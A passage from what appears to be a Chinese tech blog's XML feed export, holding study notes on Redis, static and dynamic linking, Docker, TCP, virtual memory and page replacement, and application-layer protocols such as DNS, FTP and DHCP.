缓存将热点数据放到内存中，设置内存的最大使用量以及淘汰策略来保证缓存的命中率。 查找表例如 DNS 记录就很适合使用 Redis 进行存储。 查找表和缓存类似，也是利用了 Redis 快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效，因为缓存不作为可靠的数据来源。 消息队列List 是一个双向链表，可以通过 lpush 和 rpop 写入和读取消息 不过最好使用 Kafka、RabbitMQ 等消息中间件。 会话缓存可以使用 Redis 来统一存储多台应用服务器的会话信息。 当应用服务器不再存储用户的会话信息，也就不再具有状态，一个用户可以请求任意一个应用服务器，从而更容易实现高可用性以及可伸缩性。 分布式锁实现在分布式场景下，无法使用单机环境下的锁来对多个节点上的进程进行同步。 可以使用 Redis 自带的 SETNX 命令实现分布式锁，除此之外，还可以使用官方提供的 RedLock 分布式锁实现。 其它Set 可以实现交集、并集等操作，从而实现共同好友等功能。 ZSet 可以实现有序性操作，从而实现排行榜等功能。 五、Redis 与 Memcached两者都是非关系型内存键值数据库，主要有以下不同： 数据类型Memcached 仅支持字符串类型，而 Redis 支持五种不同的数据类型，可以更灵活地解决问题。 数据持久化Redis 支持两种持久化策略：RDB 快照和 AOF 日志，而 Memcached 不支持持久化。 分布式Memcached 不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。 Redis Cluster 实现了分布式的支持。 内存管理机制 在 Redis 中，并不是所有数据都一直存储在内存中，可以将一些很久没用的 value 交换到磁盘，而 Memcached 的数据则会一直在内存中。 Memcached 将内存分割成特定长度的块来存储数据，以完全解决内存碎片的问题。但是这种方式会使得内存的利用率不高，例如块的大小为 128 bytes，只存储 100 bytes 的数据，那么剩下的 28 bytes 就浪费掉了。 六、键的过期时间Redis 可以为每个键设置过期时间，当键过期时，会自动删除该键。 对于散列表这种容器，只能为整个键设置过期时间（整个散列表），而不能为键里面的单个元素设置过期时间。 七、数据淘汰策略可以设置内存最大使用量，当内存使用量超出时，会施行数据淘汰策略。 Redis 具体有 6 种淘汰策略： 策略 描述 volatile-lru 从已设置过期时间的数据集中挑选最近最少使用的数据淘汰 volatile-ttl 从已设置过期时间的数据集中挑选将要过期的数据淘汰 volatile-random 从已设置过期时间的数据集中任意选择数据淘汰 allkeys-lru 从所有数据集中挑选最近最少使用的数据淘汰 allkeys-random 从所有数据集中任意选择数据进行淘汰 noeviction 禁止驱逐数据 作为内存数据库，出于对性能和内存消耗的考虑，Redis 的淘汰算法实际实现上并非针对所有 key，而是抽样一小部分并且从中选出被淘汰的 key。 使用 Redis 缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据。可以将内存最大使用量设置为热点数据占用的内存量，然后启用 allkeys-lru 淘汰策略，将最近最少使用的数据淘汰。 Redis 4.0 引入了 volatile-lfu 和 allkeys-lfu 淘汰策略，LFU 策略通过统计访问频率，将访问频率最少的键值对淘汰。 八、持久化Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。 RDB 持久化将某个时间点的所有数据都存放到硬盘上。 可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。 如果系统发生故障，将会丢失最后一次创建快照之后的数据。 如果数据量很大，保存快照的时间会很长。 AOF 持久化将写命令添加到 AOF 文件（Append Only File）的末尾。 使用 AOF 持久化需要设置同步选项，从而确保写命令什么时候会同步到磁盘文件上。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。有以下同步选项： 选项 同步频率 always 每个写命令都同步 everysec 每秒同步一次 no 让操作系统来决定何时同步 always 选项会严重减低服务器的性能； everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响； no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。 随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。 九、事务一个事务包含了多个命令，服务器在执行事务期间，不会改去执行其它客户端的命令请求。 事务中的多个命令被一次性发送给服务器，而不是一条一条发送，这种方式被称为流水线，它可以减少客户端与服务器之间的网络通信次数从而提升性能。 Redis 最简单的事务实现方式是使用 MULTI 和 EXEC 命令将事务操作包围起来。 十、事件Redis 服务器是一个事件驱动程序。 文件事件服务器通过套接字与客户端或者其它服务器进行通信，文件事件就是对套接字操作的抽象。 Redis 基于 Reactor 模式开发了自己的网络事件处理器，使用 I/O 多路复用程序来同时监听多个套接字，并将到达的事件传送给文件事件分派器，分派器会根据套接字产生的事件类型调用相应的事件处理器。 时间事件服务器有一些操作需要在给定的时间点执行，时间事件是对这类定时操作的抽象。 时间事件又分为： 定时事件：是让一段程序在指定的时间之内执行一次； 周期性事件：是让一段程序每隔指定时间就执行一次。 Redis 将所有时间事件都放在一个无序链表中，通过遍历整个链表查找出已到达的时间事件，并调用相应的事件处理器。 事件的调度与执行服务器需要不断监听文件事件的套接字才能得到待处理的文件事件，但是不能一直监听，否则时间事件无法在规定的时间内执行，因此监听时间应该根据距离现在最近的时间事件来决定。 事件调度与执行由 aeProcessEvents 函数负责，伪代码如下： 12345678910111213141516def aeProcessEvents(): # 获取到达时间离当前时间最接近的时间事件 time_event = aeSearchNearestTimer() # 计算最接近的时间事件距离到达还有多少毫秒 remaind_ms = time_event.when - unix_ts_now() # 如果事件已到达，那么 remaind_ms 的值可能为负数，将它设为 0 if remaind_ms &lt; 0: remaind_ms = 0 # 根据 remaind_ms 的值，创建 timeval timeval = create_timeval_with_ms(remaind_ms) # 阻塞并等待文件事件产生，最大阻塞时间由传入的 timeval 决定 aeApiPoll(timeval) # 处理所有已产生的文件事件 procesFileEvents() # 处理所有已到达的时间事件 processTimeEvents() 将 aeProcessEvents 函数置于一个循环里面，加上初始化和清理函数，就构成了 Redis 服务器的主函数，伪代码如下： 12345678def main(): # 初始化服务器 init_server() # 一直处理事件，直到服务器关闭为止 while server_is_not_shutdown(): aeProcessEvents() # 服务器关闭，执行清理操作 clean_server() 从事件处理的角度来看，服务器运行流程如下： 十一、复制通过使用 slaveof host port 命令来让一个服务器成为另一个服务器的从服务器。 一个从服务器只能有一个主服务器，并且不支持主主复制。 连接过程 主服务器创建快照文件，发送给从服务器，并在发送期间使用缓冲区记录执行的写命令。快照文件发送完毕之后，开始向从服务器发送存储在缓冲区中的写命令； 从服务器丢弃所有旧数据，载入主服务器发来的快照文件，之后从服务器开始接受主服务器发来的写命令； 主服务器每执行一次写命令，就向从服务器发送相同的写命令。 主从链随着负载不断上升，主服务器可能无法很快地更新所有从服务器，或者重新连接和重新同步从服务器将导致系统超载。为了解决这个问题，可以创建一个中间层来分担主服务器的复制工作。中间层的服务器是最上层服务器的从服务器，又是最下层服务器的主服务器。 十二、SentinelSentinel（哨兵）可以监听集群中的服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。 十三、分片分片是将数据划分为多个部分的方法，可以将数据存储到多台机器里面，这种方法在解决某些问题时可以获得线性级别的性能提升。 假设有 4 个 Redis 实例 R0，R1，R2，R3，还有很多表示用户的键 user:1，user:2，… ，有不同的方式来选择一个指定的键存储在哪个实例中。 最简单的方式是范围分片，例如用户 id 从 0~1000 的存储到实例 R0 中，用户 id 从 1001~2000 的存储到实例 R1 中，等等。但是这样需要维护一张映射范围表，维护操作代价很高。 还有一种方式是哈希分片，使用 CRC32 哈希函数将键转换为一个数字，再对实例数量求模就能知道应该存储的实例。 根据执行分片的位置，可以分为三种分片方式： 客户端分片：客户端使用一致性哈希等算法决定键应当分布到哪个节点。 代理分片：将客户端请求发送到代理上，由代理转发请求到正确的节点上。 服务器分片：Redis Cluster。 十四、一个简单的论坛系统分析该论坛系统功能如下： 可以发布文章； 可以对文章进行点赞； 在首页可以按文章的发布时间或者文章的点赞数进行排序显示。 文章信息文章包括标题、作者、赞数等信息，在关系型数据库中很容易构建一张表来存储这些信息，在 Redis 中可以使用 HASH 来存储每种信息以及其对应的值的映射。 Redis 没有关系型数据库中的表这一概念来将同种类型的数据存放在一起，而是使用命名空间的方式来实现这一功能。键名的前面部分存储命名空间，后面部分的内容存储 ID，通常使用 : 来进行分隔。例如下面的 HASH 的键名为 article:92617，其中 article 为命名空间，ID 为 92617。 点赞功能当有用户为一篇文章点赞时，除了要对该文章的 votes 字段进行加 1 操作，还必须记录该用户已经对该文章进行了点赞，防止用户点赞次数超过 1。可以建立文章的已投票用户集合来进行记录。 为了节约内存，规定一篇文章发布满一周之后，就不能再对它进行投票，而文章的已投票集合也会被删除，可以为文章的已投票集合设置一个一周的过期时间就能实现这个规定。 对文章进行排序为了按发布时间和点赞数进行排序，可以建立一个文章发布时间的有序集合和一个文章点赞数的有序集合。（下图中的 score 就是这里所说的点赞数；下面所示的有序集合分值并不直接是时间和点赞数，而是根据时间和点赞数间接计算出来的）]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>缓存</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[链接]]></title>
    <url>%2F2018%2F09%2F03%2F%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[编译系统以下是一个 hello.c 程序： 1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello, world\n"); return 0;&#125; 在 Unix 系统上，由编译器把源文件转换为目标文件。 1gcc -o hello hello.c 这个过程大致如下： 预处理阶段：处理以 # 开头的预处理命令； 编译阶段：翻译成汇编文件； 汇编阶段：将汇编文件翻译成可重定位目标文件； 链接阶段：将可重定位目标文件和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标文件。 静态链接静态链接器以一组可重定位目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务： 符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。 重定位：链接器通过把每个符号定义与一个内存位置关联起来，然后修改所有对这些符号的引用，使得它们指向这个内存位置。 目标文件 可执行目标文件：可以直接在内存中执行； 可重定位目标文件：可与其它可重定位目标文件在链接阶段合并，创建一个可执行目标文件； 共享目标文件：这是一种特殊的可重定位目标文件，可以在运行时被动态加载进内存并链接； 动态链接静态库有以下两个问题： 当静态库更新时那么整个程序都要重新进行链接； 对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。 共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点： 在给定的文件系统中一个库只有一个文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中； 在内存中，一个共享库的 .text 节（已编译程序的机器代码）的一个副本可以被不同的正在运行的进程共享。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
        <tag>链接</tag>
        <tag>编译系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker]]></title>
    <url>%2F2018%2F09%2F01%2FDocker%2F</url>
    <content type="text"><![CDATA[一、解决的问题由于不同的机器有不同的操作系统，以及不同的库和组件，在将一个应用部署到多台机器上需要进行大量的环境配置操作。 Docker 主要解决环境配置问题，它是一种虚拟化技术，对进程进行隔离，被隔离的进程独立于宿主操作系统和其它隔离的进程。使用 Docker 可以不修改应用程序代码，不需要开发人员学习特定环境下的技术，就能够将现有的应用程序部署在其它机器上。 二、与虚拟机的比较虚拟机也是一种虚拟化技术，它与 Docker 最大的区别在于它是通过模拟硬件，并在硬件上安装操作系统来实现。 启动速度启动虚拟机需要先启动虚拟机的操作系统，再启动应用，这个过程非常慢； 而启动 Docker 相当于启动宿主操作系统上的一个进程。 占用资源虚拟机是一个完整的操作系统，需要占用大量的磁盘、内存和 CPU 资源，一台机器只能开启几十个的虚拟机。 而 Docker 只是一个进程，只需要将应用以及相关的组件打包，在运行时占用很少的资源，一台机器可以开启成千上万个 Docker。 三、优势除了启动速度快以及占用资源少之外，Docker 具有以下优势： 更容易迁移提供一致性的运行环境。已经打包好的应用可以在不同的机器上进行迁移，而不用担心环境变化导致无法运行。 更容易维护使用分层技术和镜像，使得应用可以更容易复用重复的部分。复用程度越高，维护工作也越容易。 更容易扩展可以使用基础镜像进一步扩展得到新的镜像，并且官方和开源社区提供了大量的镜像，通过扩展这些镜像可以非常容易得到我们想要的镜像。 四、使用场景持续集成持续集成指的是频繁地将代码集成到主干上，这样能够更快地发现错误。 Docker 具有轻量级以及隔离性的特点，在将代码集成到一个 Docker 中不会对其它 Docker 产生影响。 提供可伸缩的云服务根据应用的负载情况，可以很容易地增加或者减少 Docker。 搭建微服务架构Docker 轻量级的特点使得它很适合用于部署、维护、组合微服务。 五、镜像与容器镜像是一种静态的结构，可以看成面向对象里面的类，而容器是镜像的一个实例。 镜像包含着容器运行时所需要的代码以及其它组件，它是一种分层结构，每一层都是只读的（read-only layers）。构建镜像时，会一层一层构建，前一层是后一层的基础。镜像的这种分层存储结构很适合镜像的复用以及定制。 构建容器时，通过在镜像的基础上添加一个可写层（writable layer），用来保存着容器运行过程中的修改。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>容器</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[传输层]]></title>
    <url>%2F2018%2F07%2F09%2F%E4%BC%A0%E8%BE%93%E5%B1%82%2F</url>
    <content type="text"><![CDATA[网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。传输层提供了进程间的逻辑通信，传输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看起来像是在两个传输层实体之间有一条端到端的逻辑通信信道。 UDP 和 TCP 的特点 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。 UDP 首部格式 首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。 TCP 首部格式 序号 ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。 确认号 ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。 数据偏移 ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。 确认 ACK ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。 同步 SYN ：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。 终止 FIN ：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。 窗口 ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。 TCP 的三次握手 假设 A 为客户端，B 为服务器端。 首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。 A 向 B 发送连接请求报文，SYN=1，ACK=0，选择一个初始的序号 x。 B 收到连接请求报文，如果同意建立连接，则向 A 发送连接确认报文，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。 A 收到 B 的连接确认报文后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。 B 收到 A 的确认后，连接建立。 三次握手的原因 第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。 客户端发送的连接请求如果在网络中滞留，那么就会隔很长一段时间才能收到服务器端发回的连接确认。客户端等待一个超时重传时间之后，就会重新请求连接。但是这个滞留的连接请求最后还是会到达服务器，如果不进行三次握手，那么服务器就会打开两个连接。如果有第三次握手，客户端会忽略服务器之后发送的对滞留连接请求的连接确认，不进行第三次握手，因此就不会再次打开连接。 TCP 的四次挥手 以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。 A 发送连接释放报文，FIN=1。 B 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。 当 B 不再需要连接时，发送连接释放报文，FIN=1。 A 收到后发出确认，进入 TIME-WAIT 状态，等待 2 MSL（最大报文存活时间）后释放连接。 B 收到 A 的确认后释放连接。 四次挥手的原因 客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。 TIME_WAIT 客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由： 确保最后一个确认报文能够到达。如果 B 没收到 A 发送来的确认报文，那么就会重新发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。 等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。 TCP 可靠传输TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。 一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下： 其中，0 ≤ a ＜ 1，RTTs 随着 a 的增加更容易受到 RTT 的影响。 超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下： 其中 RTTd 为偏差的加权平均值。 TCP 滑动窗口窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。 发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。 接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。 TCP 流量控制流量控制是为了控制发送方发送速率，保证接收方来得及接收。 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。 TCP 拥塞控制如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。 TCP 主要通过四个算法来进行拥塞控制：慢开始、拥塞避免、快重传、快恢复。 发送方需要维护一个叫做拥塞窗口（cwnd）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。 为了便于讨论，做如下假设： 接收方有足够大的接收缓存，因此不会发生流量控制； 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。 1. 慢开始与拥塞避免发送的最初执行慢开始，令 cwnd = 1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 … 注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能性也就更高。设置一个慢开始门限 ssthresh，当 cwnd &gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。 如果出现了超时，则令 ssthresh = cwnd / 2，然后重新执行慢开始。 2. 快重传与快恢复在接收方，要求每次接收到报文段都应该对最后一个已收到的有序报文段进行确认。例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。 在发送方，如果收到三个重复确认，那么可以知道下一个报文段丢失，此时执行快重传，立即重传下一个报文段。例如收到三个 M2，则 M3 丢失，立即重传 M3。 在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此执行快恢复，令 ssthresh = cwnd / 2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。 慢开始和快恢复的快慢指的是 cwnd 的设定值，而不是 cwnd 的增长速率。慢开始 cwnd 设定为 1，而快恢复 cwnd 设定为 ssthresh。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>传输层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内存管理]]></title>
    <url>%2F2018%2F07%2F05%2F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[虚拟内存虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存。 为了更好的管理内存，操作系统将内存抽象成地址空间。每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到不在物理内存中的页时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。 从上面的描述中可以看出，虚拟内存允许程序不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行，这使得有限的内存运行大程序成为可能。例如有一台计算机可以产生 16 位地址，那么一个程序的地址空间范围是 0~64K。该计算机只有 32KB 的物理内存，虚拟内存技术允许该计算机运行一个 64K 大小的程序。 分页系统地址映射内存管理单元（MMU）管理着地址空间和物理内存的转换，其中的页表（Page table）存储着页（程序地址空间）和页框（物理内存空间）的映射表。 一个虚拟地址分成两个部分，一部分存储页面号，一部分存储偏移量。 下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。例如对于虚拟地址（0010 000000000100），前 4 位是存储页面号 2，读取表项内容为（110 1），页表项最后一位表示是否存在于内存中，1 表示存在。后 12 位存储偏移量。这个页对应的页框的地址为 （110 000000000100）。 页面置换算法在程序运行过程中，如果要访问的页面不在内存中，就发生缺页中断从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。 页面置换算法和缓存淘汰策略类似，可以将内存看成磁盘的缓存。在缓存系统中，缓存的大小有限，当有新的缓存到达时，需要淘汰一部分已经存在的缓存，这样才有空间存放新的缓存数据。 页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。 1. 最佳 OPT, Optimal replacement algorithm 所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。 是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。 举例：一个系统为某进程分配了三个物理块，并有如下页面引用序列： 17，0，1，2，0，3，0，4，2，3，0，3，2，1，2，0，1，7，0，1 开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。 2. 最近最久未使用 LRU, Least Recently Used 虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。 为了实现 LRU，需要在内存中维护一个所有页面的链表。当一个页面被访问时，将这个页面移到链表表头。这样就能保证链表表尾的页面是最近最久未访问的。 因为每次访问都需要更新链表，因此这种方式实现的 LRU 代价很高。 14，7，0，7，1，0，1，2，1，2，6 3. 最近未使用 NRU, Not Recently Used 每个页面都有两个状态位：R 与 M，当页面被访问时设置页面的 R=1，当页面被修改时设置 M=1。其中 R 位会定时被清零。可以将页面分成以下四类： R=0，M=0 R=0，M=1 R=1，M=0 R=1，M=1 当发生缺页中断时，NRU 算法随机地从类编号最小的非空类中挑选一个页面将它换出。 NRU 优先换出已经被修改的脏页面（R=0，M=1），而不是被频繁使用的干净页面（R=1，M=0）。 4. 先进先出 FIFO, First In First Out 选择换出的页面是最先进入的页面。 该算法会将那些经常被访问的页面也被换出，从而使缺页率升高。 5. 第二次机会算法FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改： 当页面被访问 (读或写) 时设置该页面的 R 位为 1。需要替换的时候，检查最老页面的 R 位。如果 R 位是 0，那么这个页面既老又没有被使用，可以立刻置换掉；如果是 1，就将 R 位清 0，并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续从链表的头部开始搜索。 6. 时钟 Clock 第二次机会算法需要在链表中移动页面，降低了效率。时钟算法使用环形链表将页面连接起来，再使用一个指针指向最老的页面。 分段虚拟内存采用的是分页技术，也就是将地址空间划分成固定大小的页，每一页再与内存进行映射。 下图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。 分段的做法是把每个表分成段，一个段构成一个独立的地址空间。每个段的长度可以不同，并且可以动态增长。 段页式程序的地址空间划分成多个拥有独立地址空间的段，每个段上的地址空间划分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。 分页与分段的比较 对程序员的透明性：分页透明，但是分段需要程序员显式划分每个段。 地址空间的维度：分页是一维地址空间，分段是二维的。 大小是否可以改变：页的大小不可变，段的大小可以动态改变。 出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
        <tag>内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应用层]]></title>
    <url>%2F2018%2F07%2F01%2F%E5%BA%94%E7%94%A8%E5%B1%82%2F</url>
    <content type="text"><![CDATA[域名系统DNS 是一个分布式数据库，提供了主机名和 IP 地址之间相互转换的服务。这里的分布式数据库是指，每个站点只保留它自己的那部分数据。 域名具有层次结构，从上到下依次为：根域名、顶级域名、二级域名。 DNS 可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53。大多数情况下 DNS 使用 UDP 进行传输，这就要求域名解析器和域名服务器都必须自己处理超时和重传从而保证可靠性。在两种情况下会使用 TCP 进行传输： 如果返回的响应超过的 512 字节（UDP 最大只支持 512 字节的数据）。 区域传送（区域传送是主域名服务器向辅助域名服务器传送变化的那部分数据）。 文件传送协议FTP 使用 TCP 进行连接，它需要两个连接来传送一个文件： 控制连接：服务器打开端口号 21 等待客户端的连接，客户端主动建立连接后，使用这个连接将客户端的命令传送给服务器，并传回服务器的应答。 数据连接：用来传送一个文件数据。 根据数据连接是否是服务器端主动建立，FTP 有主动和被动两种模式： 主动模式：服务器端主动建立数据连接，其中服务器端的端口号为 20，客户端的端口号随机，但是必须大于 1024，因为 0~1023 是熟知端口号。 被动模式：客户端主动建立数据连接，其中客户端的端口号由客户端自己指定，服务器端的端口号随机。 主动模式要求客户端开放端口号给服务器端，需要去配置客户端的防火墙。被动模式只需要服务器端开放端口号即可，无需客户端配置防火墙。但是被动模式会导致服务器端的安全性减弱，因为开放了过多的端口号。 动态主机配置协议DHCP (Dynamic Host Configuration Protocol) 提供了即插即用的连网方式，用户不再需要手动配置 IP 地址等信息。 DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、网关 IP 地址。 DHCP 工作过程如下： 客户端发送 Discover 报文，该报文的目的地址为 255.255.255.255:67，源地址为 0.0.0.0:68，被放入 UDP 中，该报文被广播到同一个子网的所有主机上。如果客户端和 DHCP 服务器不在同一个子网，就需要使用中继代理。 DHCP 服务器收到 Discover 报文之后，发送 Offer 报文给客户端，该报文包含了客户端所需要的信息。因为客户端可能收到多个 DHCP 服务器提供的信息，因此客户端需要进行选择。 如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送 Request 报文给该 DHCP 服务器。 DHCP 服务器发送 Ack 报文，表示客户端此时可以使用提供给它的信息。 远程登录协议TELNET 用于登录到远程主机上，并且远程主机上的输出也会返回。 TELNET 可以适应许多计算机和操作系统的差异，例如不同操作系统系统的换行符定义。 电子邮件协议一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件协议。 邮件协议包含发送协议和读取协议，发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。 1. SMTPSMTP 只能发送 ASCII 码，而互联网邮件扩充 MIME 可以发送二进制文件。MIME 并没有改动或者取代 SMTP，而是增加邮件主体的结构，定义了非 ASCII 码的编码规则。 2. POP3POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。 3. IMAPIMAP 协议中客户端和服务器上的邮件保持同步，如果不手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。 常用端口 应用 应用层协议 端口号 传输层协议 备注 域名解析 DNS 53 UDP/TCP 长度超过 512 字节时使用 TCP 动态主机配置协议 DHCP 67/68 UDP 简单网络管理协议 SNMP 161/162 UDP 文件传送协议 FTP 20/21 TCP 控制连接 21，数据连接 20 远程终端协议 TELNET 23 TCP 超文本传送协议 HTTP 80 TCP 简单邮件传送协议 SMTP 25 TCP 邮件读取协议 POP3 110 TCP 网际报文存取协议 IMAP 143 TCP Web 页面请求过程1. DHCP 配置主机信息 假设主机最开始没有 IP 地址以及其它信息，那么就需要先使用 DHCP 来获取。 主机生成一个 DHCP 请求报文，并将这个报文放入具有目的端口 67 和源端口 68 的 UDP 报文段中。 该报文段则被放入在一个具有广播 IP 目的地址(255.255.255.255) 和源 IP 地址（0.0.0.0）的 IP 数据报中。 该数据报则被放置在 MAC 帧中，该帧具有目的地址 FF:FF:FF:FF:FF:FF，将广播到与交换机连接的所有设备。 连接在交换机的 DHCP 服务器收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 